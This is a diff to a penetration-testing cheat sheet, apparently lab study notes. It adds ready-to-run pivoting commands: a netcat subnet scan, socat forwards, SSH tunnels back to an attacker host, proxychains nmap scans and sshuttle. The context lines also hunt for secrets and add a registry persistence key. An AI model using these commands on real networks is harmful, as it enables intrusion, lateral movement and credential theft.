@@ -683,12 +683,18 @@ find / -type f -iname *.db
 grep -Inri -e passw -e secret -e key / 2>/dev/null
 # find SUID files
 find / -perm -4000 -ls 2>/dev/null
+# view all available disks
+lsblk
+# find writable directories 
+find / -writable -type d 2>/dev/null
 # find writable config files
 find /etc -perm 2
 # find readable bash histories 
 find /home -name .bash_history -perm 4 2>/dev/null
 # find writable authorized hosts files
 find /home -name authorized_hosts -perm 2 2>dev/null
+# scan a network range using netcat
+for i in $(seq 1 254); do nc -zv -w 1 172.16.50.$i 445; done
 ```
 </details>
 
@@ -872,6 +878,107 @@ Sharphound.exe --CollectionMethods All --Domain domain.com --ExcludeDCs
 
 ## Lateral Movement
 <details>
+<summary>port forwarding</summary>
+
+```bash
+# on a compromised machine, listen on port 2345 and forward all traffic to port 5432 of 10.4.50.215
+socat -ddd TCP-LISTEN:2345,fork TCP:10.4.50.215:5432
+
+# listen on port 2222 on a compromised machine, forward all traffic to 10.4.50.215 on port 22
+socat TCP-LISTEN:2222,fork TCP:10.4.50.215:22
+
+# on attacking machine, you can effectively ssh to 10.4.50.215 via the compromised machine using the following command
+ssh user@VICTIM_IP -p 2222
+```
+</details>
+
+<details>
+<summary>ssh tunneling</summary>
+
+1. Local Port Forwarding
+
+![alt text](resources/image03.png)
+
+```bash 
+# on a compromised host (with internal network access to 10.4.50.215), forward all traffic on port 4455 through 10.4.50.215 and to 172.16.50.217 on port 445
+ssh -N -L 0.0.0.0:4455:172.16.50.217:445 database_admin@10.4.50.215
+
+# on the attacking machine, connect to 172.16.50.215 SMB share as if it were the compromised host
+smbclient -p 4455 -L //192.168.50.63/ -U hr_admin --password=Welcome1234
+```
+
+2. Dynamic Port Forwarding
+
+![alt text](resources/image02.png)
+
+``` bash
+# on a compromised host (with internal network access to 10.4.50.215), forward all traffic on port 9999 through 10.4.50.215 to any host on any port 
+ssh -N -D 0.0.0.0:9999 database_admin@10.4.50.215
+
+# on the attacking machine, configure proxychains to send traffic via the compromised host, and scan a machine that is only accessible via 10.4.50.215
+tail /etc/proxychains4.conf
+
+# add to the proxy list the following line
+socks5 192.168.50.63 9999
+
+# using proxy chains, scan a host on all ports 
+sudo proxychains nmap -vvv -sT -p- -Pn 172.16.50.217
+```
+
+3. Remote Port Forwarding 
+
+![alt text](resources/image01.png)
+
+``` bash
+# on the attacking machine, ensure you are running ssh server
+sudo systemctl start ssh
+
+# on a compromised host that has limited inbound connections, initialize a tunnel to the attacking machine that forwards traffic to 10.4.50.215 on port 5432
+ssh -N -R 127.0.0.1:2345:10.4.50.215:5432 kali@192.168.118.4
+
+# confirm the attacking machine is now listening on port 2345 
+ss -ntplu
+
+# on attacking machine, connect to 10.4.50.215 port 5432 via localhost port 2345 
+psql -h 127.0.0.1 -p 2345 -U postgres
+```
+
+4. Remote Dynamic Port Forwarding
+
+![alt text](resources/image.png)
+
+```bash
+# on the compromised host, establish an outbound connection to the attacking host
+ssh -N -R 9998 kali@192.168.118.4
+
+# reconfigure proxychains 
+tail /etc/proxychains4.conf
+
+# add to the proxy list the following line 
+socks5 127.0.0.1 9998
+
+# scan a host that is only accessible via the compromised machine
+proxychains nmap -vvv -sT --top-ports=20 -Pn -n 10.4.50.64
+```
+</details>
+
+<details>
+<summary>sshuttle</summary>
+leverage a forwarded port to provide transparent access to an internal network
+
+``` bash
+# forward port 2222 on the compromised host to port 22 on 10.4.50.215
+socat TCP-LISTEN:2222,fork TCP:10.4.50.215:22
+
+# on the attacking machine, configure sshuttle to use the forwarded port with the provided subnets
+sshuttle -r database_admin@192.168.50.63:2222 10.4.50.0/24 172.16.50.0/24
+
+# on the attacking machine, connect to a host as if connected to a VPN 
+smbclient -L //172.16.50.217/ -U hr_admin --password=Welcome1234
+```
+</details>
+
+<details>
 <summary> windows - living off the land </summary>
 
 ``` bat
@@ -1036,7 +1143,15 @@ reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "AppUpdateMon" /
 
 1. [GTFOBins](https://gtfobins.github.io/)  
 2. [linPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS)  
-3. Cheatsheets: [here is a good one](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)
+3. Cheatsheets: 
+
+- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md
+
+- https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation
+
+- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md
+
+- https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html
 
 </details>
 
